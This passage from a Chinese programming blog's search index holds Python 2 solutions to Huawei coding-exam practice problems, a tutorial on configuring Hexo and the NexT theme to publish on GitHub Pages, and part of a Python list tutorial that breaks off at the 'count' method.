<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line">str1 = raw_input()</div><div class="line">str2 = raw_input()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">splitstr</span><span class="params">(string)</span>:</span></div><div class="line">    <span class="keyword">if</span>(len(string) != <span class="number">0</span>):</div><div class="line">        string += <span class="string">"0000000"</span></div><div class="line">    <span class="keyword">while</span>(len(string) &gt;= <span class="number">8</span>):    <span class="comment">#字符串长度大于等于8才打印出来</span></div><div class="line">        <span class="keyword">print</span> string[<span class="number">0</span>:<span class="number">8</span>]   <span class="comment">#使用分片的方法切分字符串</span></div><div class="line">        string = string[<span class="number">8</span>:]</div><div class="line"></div><div class="line">splitstr(str1)</div><div class="line">splitstr(str2)</div></pre></td></tr></table></figure>
<p>（2）写法二</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">a = raw_input()</div><div class="line">b = raw_input()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">substr</span><span class="params">(line)</span>:</span></div><div class="line">    left = len(line)%<span class="number">8</span></div><div class="line">    <span class="keyword">if</span> left!=<span class="number">0</span>:</div><div class="line">        line += <span class="string">"0"</span> * (<span class="number">8</span>-left)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(line)/<span class="number">8</span>):    <span class="comment">#字符串长度大于等于8才打印出来</span></div><div class="line">        <span class="keyword">print</span> line[i*<span class="number">8</span> : (i+<span class="number">1</span>)*<span class="number">8</span>]   <span class="comment">#使用索引加分片的方法切分字符串</span></div><div class="line"></div><div class="line">substr(a)</div><div class="line">substr(b)</div></pre></td></tr></table></figure>
<p>（3）写法三</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line">str1 = raw_input()</div><div class="line">str2 = raw_input()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">substr</span><span class="params">(string)</span>:</span></div><div class="line">    <span class="keyword">if</span>(len(string) != <span class="number">0</span>):</div><div class="line">        string += <span class="string">"0000000"</span></div><div class="line">    mylist = re.findall(<span class="string">r'.&#123;8&#125;'</span>,string)     <span class="comment">#用正则表达式对字符串进行切分</span></div><div class="line">    <span class="keyword">for</span> substr <span class="keyword">in</span> mylist:   <span class="comment">#打印切分好的以8个字符为间隔的字符串</span></div><div class="line">        <span class="keyword">print</span> substr</div><div class="line"></div><div class="line">substr(str1)</div><div class="line">substr(str2)</div></pre></td></tr></table></figure>
<h4 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h4><h5 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h5><p>写出一个程序，接受一个十六进制的数值字符串，输出该数值的十进制字符串。（多组同时输入 ）</p>
<p>输入描述:</p>
<p>输入一个十六进制的数值字符串。</p>
<p>输出描述:</p>
<p>输出该数值的十进制字符串。</p>
<p>输入例子:</p>
<p>0xA</p>
<p>输出例子:</p>
<p>10</p>
<h5 id="Python实现-3"><a href="#Python实现-3" class="headerlink" title="Python实现"></a>Python实现</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"><span class="keyword">for</span> line <span class="keyword">in</span> sys.stdin:</div><div class="line">    <span class="keyword">print</span> int(line, <span class="number">16</span>)</div></pre></td></tr></table></figure>
<p>其中，for line in sys.stdin实现多行输入</p>
<p>这里并不是将line转换为16进制的数，而是说line就是一个16进制的数形式的字符串，int()函数将其用十进制数表示</p>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>Exercise</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>算法学习</tag>
        <tag>华为机试</tag>
      </tags>
  </entry>
  <entry>
    <title>Github Pages + Hexo 搭建博客（二）</title>
    <url>/2016/12/03/Github%20Pages%20+%20Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<p>此篇博客主要讲解Hexo的站点配置、主题配置和使用以及博客文章的发布。</p>
<a id="more"></a>
<p>在Hexo中有两份主要的配置文件，其名称都是_config.yml。其中，一份位于站点根目录下，主要包含Hexo本身的配置,我们称之为<strong>全局配置文件</strong>；另一份位于主题目录下，这份配置由主题作者提供，主要用于配置主题相关的选项,我们称之为<strong>主题配置文件</strong>。</p>
<p>hexo的官方网站：<a href="https://hexo.io/" target="_blank" rel="external">https://hexo.io/</a>，里面有hexo的详细说明文档，不过是英文的。没关系，英语不好的请往下看。</p>
<p><strong>注意：配置文件中每个字段后面的冒号是英文格式的，且在其后要加一个空格再写值</strong></p>
<p>比如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">title: Myblog</div></pre></td></tr></table></figure>
<h4 id="hexo的站点配置"><a href="#hexo的站点配置" class="headerlink" title="hexo的站点配置"></a>hexo的站点配置</h4><p>编辑hexo目录下的_config.yml文件，具体配置如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line"># Hexo Configuration</div><div class="line">## Docs: https://hexo.io/docs/configuration.html</div><div class="line">## Source: https://github.com/hexojs/hexo/</div><div class="line"></div><div class="line"># Site 站点信息配置，根据自己的需要进行修改</div><div class="line">title: Line&apos;s Blog    #站点名，会在浏览器页面标签左上角显示</div><div class="line">subtitle: Love Coding,Enjoy Life  #副标题</div><div class="line">description: fzy-line  #对站点的描述，给搜索引擎看的，可以自定义</div><div class="line">author: Line  #网站作者</div><div class="line">language: zh-Hans  #网站语言</div><div class="line">timezone: Asia/Shanghai  #时区</div><div class="line">avatar: /images/logo.jpg  #网站logo，会在浏览器页面标签左上角显示</div><div class="line"></div><div class="line"># URL 博客地址,与申请的GitHub一致</div><div class="line">## If your site is put in a subdirectory, set url as &apos;http://yoursite.com/child&apos; and root as &apos;/child/&apos;</div><div class="line">url: https://fzy-line.github.io/</div><div class="line">root: /</div><div class="line">#博客链接格式</div><div class="line">permalink: :year/:month/:day/:title/ </div><div class="line">permalink_defaults:</div><div class="line"></div><div class="line"># Directory  #目录设置，一般不修改</div><div class="line">source_dir: source  #资源文件夹，放在里面的文件会上传到github中</div><div class="line">public_dir: public  #公共文件夹，存放生成的静态文件</div><div class="line">tag_dir: tags  #标签文件夹，默认是tags。实际存放在source/tags中。</div><div class="line">archive_dir: archives  #档案文件夹，默认是archives。</div><div class="line">category_dir: categories  #分类文件夹，默认是categories。实际存放在source/categories中。</div><div class="line">code_dir: downloads/code  #代码文件夹，默认是downloads/code</div><div class="line">i18n_dir: :lang  #国际化文件夹，默认跟language相同</div><div class="line">skip_render:  #跳过指定文件的渲染，您可使用 glob 来配置路径。</div><div class="line"></div><div class="line"># Writing  这是文章布局、写作格式的定义，一般不修改</div><div class="line">new_post_name: :title.md # File name of new posts</div><div class="line">default_layout: post</div><div class="line">titlecase: false # Transform title into titlecase</div><div class="line">external_link: true # Open external links in new tab</div><div class="line">filename_case: 0</div><div class="line">render_drafts: false</div><div class="line">post_asset_folder: false</div><div class="line">relative_link: false</div><div class="line">future: true</div><div class="line">highlight:</div><div class="line">  enable: true</div><div class="line">  line_number: true</div><div class="line">  auto_detect: false</div><div class="line">  tab_replace:</div><div class="line"></div><div class="line"># Category &amp; Tag  #分类和标签，一般不修改</div><div class="line">default_category: uncategorized</div><div class="line">category_map:</div><div class="line">tag_map:</div><div class="line"></div><div class="line"># Date / Time format  #日期、时间格式，一般不修改</div><div class="line">## Hexo uses Moment.js to parse and display date</div><div class="line">## You can customize the date format as defined in</div><div class="line">## http://momentjs.com/docs/#/displaying/format/</div><div class="line">date_format: YYYY-MM-DD </div><div class="line">time_format: HH:mm:ss</div><div class="line"></div><div class="line"># Pagination  #可根据自己需要修改</div><div class="line">## Set per_page to 0 to disable pagination</div><div class="line">per_page: 6  #分页，每页文章数量</div><div class="line">pagination_dir: page</div><div class="line"></div><div class="line"># Extensions  #扩展</div><div class="line">## Plugins: https://hexo.io/plugins/</div><div class="line">## Themes: https://hexo.io/themes/</div><div class="line">theme: next  #博客主题</div><div class="line">  </div><div class="line"># Deployment 这里配置站点部署到Github，上一节中已经讲过</div><div class="line">## Docs: https://hexo.io/docs/deployment.html</div><div class="line">deploy:</div><div class="line">  type: git</div><div class="line">  repository: git@github.com:你的Github用户名.github.io.git</div><div class="line">  branch: master</div></pre></td></tr></table></figure>
<h4 id="hexo使用主题"><a href="#hexo使用主题" class="headerlink" title="hexo使用主题"></a>hexo使用主题</h4><p>Hexo 安装主题的方式非常简单，只需要将主题文件拷贝至站点目录的 themes 目录下， 然后修改下配置文件即可。</p>
<p>hexo官方主题下载地址：<a href="https://hexo.io/themes/" target="_blank" rel="external">https://hexo.io/themes/</a>，里面有多种多样的主题模板供大家选择。</p>
<p>这里推荐一款很火的主题：next，下面的配置也是以这个主题为例。如果你使用的是其他的主题，那么请你自己根据说明文档进行配置。</p>
<p>next主题的官网，有很详细的配置文档：<a href="http://theme-next.iissnan.com/" target="_blank" rel="external">http://theme-next.iissnan.com/</a></p>
<h5 id="下载主题"><a href="#下载主题" class="headerlink" title="下载主题"></a>下载主题</h5><p>next下载地址：<a href="https://github.com/iissnan/hexo-theme-next" target="_blank" rel="external">https://github.com/iissnan/hexo-theme-next</a></p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/12/2-1.png" alt="2-1"></p>
<p>到Gtihub下载此主题后解压，打开可以看到里面很多主题相关的文件，我们将此文件夹改名为next，然后将它复制到站点目录的/themes/目录下。</p>
<h5 id="启用主题"><a href="#启用主题" class="headerlink" title="启用主题"></a>启用主题</h5><p>hexo默认是使用的landscape主题，我们可以在站点目录下的/themes/目录下看到landscape文件夹。</p>
<p>我们的themes文件夹里可以放很多主题的文件夹，但是实际上我们的网站采用哪一个主题，这是需要我们进行配置的，打开编辑全局配置文件，找到下面的内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line"># Extensions  #扩展</div><div class="line">## Plugins: https://hexo.io/plugins/</div><div class="line">## Themes: https://hexo.io/themes/</div><div class="line">theme: next  #博客主题，默认是landscape</div></pre></td></tr></table></figure>
<p>在theme字段这里填上你下载的主题的文件夹的名字，例如我们使用next主题就填上next。这样配置文件就和我们的主题文件关联起来了。</p>
<h5 id="配置主题配置文件"><a href="#配置主题配置文件" class="headerlink" title="配置主题配置文件"></a>配置主题配置文件</h5><p>主题配置文件位于站点目录下的/themes/next/目录下，打开编辑，这里我们只贴出需要修改的地方进行介绍，如下：</p>
<p><strong>（1）配置基本信息</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line"># 网站图标，将其放在hexo站点/source/目录下</div><div class="line">favicon: /logo.jpg</div><div class="line"></div><div class="line"># 关键词，例如下面是我写的</div><div class="line">keywords: &quot;Python,Life,Android&quot;</div><div class="line"></div><div class="line"># 网站建立时间，显示在页面底部</div><div class="line">since: 2016</div><div class="line"></div><div class="line"># 网站版权声明，显示在页面底部</div><div class="line">copyright: true</div></pre></td></tr></table></figure>
<p><strong>（2）选择外观样式</strong></p>
<p>目前 NexT 支持三种 Scheme，他们是：</p>
<p>Muse - 默认 Scheme，这是 NexT 最初的版本，黑白主调，大量留白</p>
<p>Mist - Muse 的紧凑版本，整洁有序的单栏外观</p>
<p>Pisces - 双栏 Scheme，小家碧玉似的清新</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/12/2-2.png" alt="2-2"></p>
<p>找到主题配置文件的如下三行，其中#号表示注释，要启用哪一种样式就把#号去掉即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line"># Schemes</div><div class="line">#scheme: Muse</div><div class="line">#scheme: Mist</div><div class="line">scheme: Pisces</div></pre></td></tr></table></figure>
<p><strong>（3）设置菜单</strong></p>
<p>菜单内容的设置格式是：item name: link。其中 item name 是一个名称，这个名称并不直接显示在页面上，它将用于匹配图标以及翻译。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">menu:</div><div class="line">  home: /</div><div class="line">  archives: /archives</div><div class="line">  categories: /categories</div><div class="line">  tags: /tags</div><div class="line">  about: /about</div><div class="line">  #sitemap: /sitemap.xml</div><div class="line">  #commonweal: /404.html</div></pre></td></tr></table></figure>
<p>此设定格式是 item name: icon name，其中 item name 与上一步所配置的菜单名字对应，icon name 是 Font Awesome 图标的 名字。而 enable 可用于控制是否显示图标，你可以设置成 false 来去掉图标。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">menu_icons:</div><div class="line">  enable: true</div><div class="line">  #KeyMapsToMenuItemKey: NameOfTheIconFromFontAwesome</div><div class="line">  home: home</div><div class="line">  about: user</div><div class="line">  categories: th</div><div class="line">  schedule: calendar</div><div class="line">  tags: tags</div><div class="line">  archives: archive</div><div class="line">  sitemap: sitemap</div><div class="line">  commonweal: heartbeat</div></pre></td></tr></table></figure>
<h5 id="测试配置效果"><a href="#测试配置效果" class="headerlink" title="测试配置效果"></a>测试配置效果</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$ hexo clean #用于清除缓存</div><div class="line">$ hexo generate #生成静态网页</div><div class="line">$ hexo server #开启本地预览</div></pre></td></tr></table></figure>
<p>访问：<a href="http://localhost:4000/" target="_blank" rel="external">http://localhost:4000/</a> 查看效果，如下图：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/12/2-3.png" alt="2-3"></p>
<h5 id="解决遇到的问题"><a href="#解决遇到的问题" class="headerlink" title="解决遇到的问题"></a>解决遇到的问题</h5><p>到这里会发现点击左侧菜单的分类、标签和关于会提示找不到页面。</p>
<p>这是因为我们只是创建了菜单，还没有创建相应的页面。</p>
<p>新建页面的hexo命令是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$ hexo new page &quot;pageName&quot;</div></pre></td></tr></table></figure>
<p>我们新建分类、标签、关于页面：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$ hexo new page &apos;categories&apos;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$ hexo new page &apos;tags&apos;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$ hexo new page &apos;about&apos;</div></pre></td></tr></table></figure>
<p>分别执行完这三条命令后，我们会发现站点目录下的/source/目录下多了三个文件夹：categories，tags，about，每个文件夹里面都会生成一个index.md文件，如下：</p>
<p>默认都只会生成title和date字段，我们要为其添加上type字段，并赋值。</p>
<p><strong>注意：博客文章的抬头信息中每个字段后面的冒号是英文格式的，而且其后要加一个空格再写值</strong></p>
<p>categories下的index.md：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">---</div><div class="line">title: categories</div><div class="line">date: 2016-12-02 23:28:27</div><div class="line">type: categories</div><div class="line">---</div></pre></td></tr></table></figure>
<p>tags下的index.md：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">---</div><div class="line">title: tags</div><div class="line">date: 2016-12-02 23:31:23</div><div class="line">type: tags</div><div class="line">---</div></pre></td></tr></table></figure>
<p>about下的index.md：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">---</div><div class="line">title: about</div><div class="line">date: 2016-12-02 23:31:23</div><div class="line">type: about</div><div class="line">---</div></pre></td></tr></table></figure>
<p>这样我们的这几个页面也就没有问题了。至此，基本的配置也就完成了，接下来介绍如何写博客与发布博客。</p>
<h4 id="发布博客"><a href="#发布博客" class="headerlink" title="发布博客"></a>发布博客</h4><h5 id="新建博客文章"><a href="#新建博客文章" class="headerlink" title="新建博客文章"></a>新建博客文章</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$ hexo new &quot;postName&quot; #新建文章</div></pre></td></tr></table></figure>
<p>实例：</p>
<p>新建博客《我的第一篇博客》</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$ hexo new &quot;我的第一篇博客&quot;</div></pre></td></tr></table></figure>
<p>到站点目录下的/source/_posts/目录下可以看到生成了名为：我的第一篇博客.md的文件，这是Markdown格式的文件，可以用sublime text3或者notepad++等编辑器打开，也可以下载一个MarkdownPad来编辑Markdown文件。</p>
<p>Markdown是一种可以使用普通文本编辑器编写的标记语言，通过简单的标记语法，它可以使普通文本内容具有一定的格式。</p>
<p>如果你没有使用过Markdown编辑器，那请你自己去学习一下Markdown语法。</p>
<p>Markdown 语法说明(简体中文版)：<a href="http://www.appinn.com/markdown/" target="_blank" rel="external">http://www.appinn.com/markdown/</a></p>
<h5 id="编辑博客"><a href="#编辑博客" class="headerlink" title="编辑博客"></a>编辑博客</h5><p>Hexo默认新建的文章抬头已有title、date、tags等属性，可能缺乏categories和meta标签，想要指定目录就需要添加categories属性，而meta标签则是为了便于搜索引擎的收录。如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">---</div><div class="line">title: 我的第一篇博客</div><div class="line">date: 2016-12-02 23:44:20</div><div class="line">tags: #文章标签 可以省略</div><div class="line">---</div></pre></td></tr></table></figure>
<p>tags字段是文章的标签，可以指定标签也可以不指定，如果要指定多个标签需要这样做：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">tags: [Linux,Http,网络]</div></pre></td></tr></table></figure>
<p>我们可以添加上categories字段，对博客进行分类管理，然后点击主页左侧菜单的分类就可看到具体的分类。例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">categories: Linux</div></pre></td></tr></table></figure>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/12/2-4.png" alt="2-4"></p>
<p><strong>如何实现上图的阅读全文功能？</strong></p>
<p>在自己喜欢的位置添加一个：<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;!--more--&gt;</div></pre></td></tr></table></figure></p>
<p>即可，主题会自动识别这个标签，生成对应的阅读全文按钮。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">以上是文章摘要</div><div class="line">&lt;!--more--&gt;</div><div class="line">以下是余下全文</div></pre></td></tr></table></figure>
<h5 id="发布博客-1"><a href="#发布博客-1" class="headerlink" title="发布博客"></a>发布博客</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$ hexo clean  #清除缓存 网页正常情况下可以忽略此条命令</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$ hexo generate  #生成静态页面至public目录</div></pre></td></tr></table></figure>
<p>写好之后可以现在本地预览，确定无误之后再部署到Github上。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$ hexo server  #开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server）</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$ hexo deploy  #将.deploy目录部署到GitHub</div></pre></td></tr></table></figure>
<p>需要说明的是：</p>
<p>我们博客文章的编写都是Markdown文件，但是发布到github上的其实是html文件，将Markdown转换成html这个工作我们只要输入hexo generate命令即可，hexo会帮我们完成转换。</p>
<h5 id="hexo命令简写形式"><a href="#hexo命令简写形式" class="headerlink" title="hexo命令简写形式"></a>hexo命令简写形式</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">hexo n &quot;我的博客&quot; == hexo new &quot;我的博客&quot;</div><div class="line">hexo g == hexo generate</div><div class="line">hexo s == hexo server</div><div class="line">hexo d == hexo deploy</div></pre></td></tr></table></figure>
<p>下一篇博客主要讲解如何优化next主题，使用主题提供的一些第三方功能。</p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Github Pages</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 序列详解-列表</title>
    <url>/2016/12/01/Python%20%E5%BA%8F%E5%88%97%E8%AF%A6%E8%A7%A3-%E5%88%97%E8%A1%A8/</url>
    <content><![CDATA[<h4 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h4><ul>
<li><p>列表是最常用的 Python 数据类型。</p>
</li>
<li><p>列表是可变的。</p>
</li>
<li><p>列表的数据项不需要具有相同的类型。</p>
</li>
<li><p>列表用 [] 符号或 list() 创建。</p>
</li>
</ul>
<a id="more"></a>
<h4 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h4><h5 id="list函数"><a href="#list函数" class="headerlink" title="list函数"></a>list函数</h5><p>　　将序列转换成列表。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>list(<span class="string">'Hunau'</span>)</div><div class="line">[<span class="string">'H'</span>, <span class="string">'u'</span>, <span class="string">'n'</span>, <span class="string">'a'</span>, <span class="string">'u'</span>]</div></pre></td></tr></table></figure>
<p>　　list 函数适用于所有类型的序列，而不只是字符串。</p>
<h5 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h5><p>　　使用列表的索引标记来为某个特定的、位置明确的元素赋值。不能为一个位置不存在的元素进行赋值。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst[<span class="number">2</span>] = <span class="number">4</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst</div><div class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>]</div></pre></td></tr></table></figure>
<h5 id="分片赋值"><a href="#分片赋值" class="headerlink" title="分片赋值"></a>分片赋值</h5><ol>
<li>通过分片赋值进行替换</li>
</ol>
<p>　　可以一次为多个元素赋值，并且使用与原序列不等长的序列将分片替换：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst[<span class="number">1</span>:<span class="number">3</span>] = list(<span class="string">'xx'</span>)  <span class="comment">#等长替换</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst</div><div class="line">[<span class="number">1</span>, <span class="string">'x'</span>, <span class="string">'x'</span>, <span class="number">4</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst[<span class="number">1</span>:] = list(<span class="string">'python'</span>)  <span class="comment">#不等长替换</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst</div><div class="line">[<span class="number">1</span>, <span class="string">'p'</span>, <span class="string">'y'</span>, <span class="string">'t'</span>, <span class="string">'h'</span>, <span class="string">'o'</span>, <span class="string">'n'</span>]</div></pre></td></tr></table></figure>
<ol>
<li>通过分片赋值进行插入</li>
</ol>
<p>　　可以在不替换任何原有元素的情况下插入新的元素：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst = [<span class="number">1</span>,<span class="number">6</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst[<span class="number">1</span>:<span class="number">1</span>] = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst</div><div class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</div></pre></td></tr></table></figure>
<ol>
<li>通过分片赋值进行删除</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst[<span class="number">1</span>:<span class="number">5</span>] = []</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst</div><div class="line">[<span class="number">1</span>, <span class="number">6</span>]</div></pre></td></tr></table></figure>
<h5 id="删除元素"><a href="#删除元素" class="headerlink" title="删除元素"></a>删除元素</h5><p>　　有个方法可以从列表中按给定的索引而不是值来删除一个子项：del 语句。语句 del 还可以从列表中删除切片或清空整个列表。另外，del 也可以用来删除整个变量。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> lst[<span class="number">1</span>]  <span class="comment">#删除一个元素</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst</div><div class="line">[<span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> lst[<span class="number">0</span>:<span class="number">2</span>]  <span class="comment">#借助分片删除多个元素</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst</div><div class="line">[<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> lst[:]  <span class="comment">#删除列表的所有元素</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst</div><div class="line">[]</div></pre></td></tr></table></figure>
<h4 id="列表对象方法"><a href="#列表对象方法" class="headerlink" title="列表对象方法"></a>列表对象方法</h4><h5 id="append"><a href="#append" class="headerlink" title="append"></a>append</h5><p>　　把一个元素添加到列表的结尾，相当于 a[len(a):] = [x]。它是直接修改列表，而不是返回一个新的列表。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst = [<span class="number">1</span>,<span class="number">2</span>,<span class="string">'x'</span>,<span class="string">'y'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst.append(<span class="number">3</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst</div><div class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="string">'x'</span>, <span class="string">'y'</span>, <span class="number">3</span>]</div></pre></td></tr></table></figure>
<h5 id="extend"><a href="#extend" class="headerlink" title="extend"></a>extend</h5><p>　　将一个给定列表中的所有元素都添加到另一个列表中，相当于 a[len(a):] = L 。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>b = [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a.extend(b)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a</div><div class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</div></pre></td></tr></table></figure>
<p>　　对比连接操作：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>b = [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a + b</div><div class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</div></pre></td></tr></table></figure>
<p>　　看似两种方法得到的结果一样，实则不然。extend 与连接操作最大的区别在于：extend 方法修改了被扩展的序列（即上例中的 a 列表），而使用 + 号进行连接操作则会返回一个新的列表。</p>
<h5 id="insert"><a href="#insert" class="headerlink" title="insert"></a>insert</h5><p>　　在指定位置插入一个元素。第一个参数是准备插入到其前面的那个元素的索引，例如 lst.insert(0, x) 会插入到整个列表之前，而 lst.insert(len(lst), x) 相当于 lst.append(x)。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst = [<span class="number">2</span>,<span class="number">4</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst.insert(<span class="number">0</span>,<span class="number">1</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst</div><div class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst.insert(<span class="number">3</span>,<span class="number">5</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst</div><div class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">5</span>]</div></pre></td></tr></table></figure>
<h5 id="count"><a href="#count" class="headerlink" title="count"></a>count</h5><p>　　统计某个元素在列表中出现的次数。</p>
